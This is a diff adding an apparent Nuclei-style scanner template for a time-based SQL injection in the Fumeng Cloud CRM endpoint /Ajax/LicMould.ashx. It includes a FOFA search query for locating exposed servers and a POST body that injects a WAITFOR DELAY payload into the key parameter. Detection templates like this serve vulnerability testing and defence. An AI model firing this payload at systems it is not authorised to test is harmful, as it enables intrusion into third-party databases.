@@ -1,0 +1,31 @@
+id: fumingyun-LicMould-sqli
+
+info:
+  name: 孚盟云CRM /LicMould.ashx SQL注入漏洞
+  author: onewin
+  severity: high
+  description: |
+    孚盟云CRM /LicMould.ashx SQL注入漏洞，攻击者可通过FUID参数获取数据库版本信息
+  metadata:
+    fofa-query: 'body="孚盟云" || body="/PageStructure/Mail/default.aspx"'
+  tags: Fumeng-Cloud-孚盟云
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/Ajax/LicMould.ashx"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      action=DeleteEmp&key=1%20WAITFOR%20DELAY%20'0:0:4'--&fuids=abc,def
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: dsl
+        dsl:
+          - "duration>=3 && duration<8"
+      - type: word
+        words:
+          - "ok"
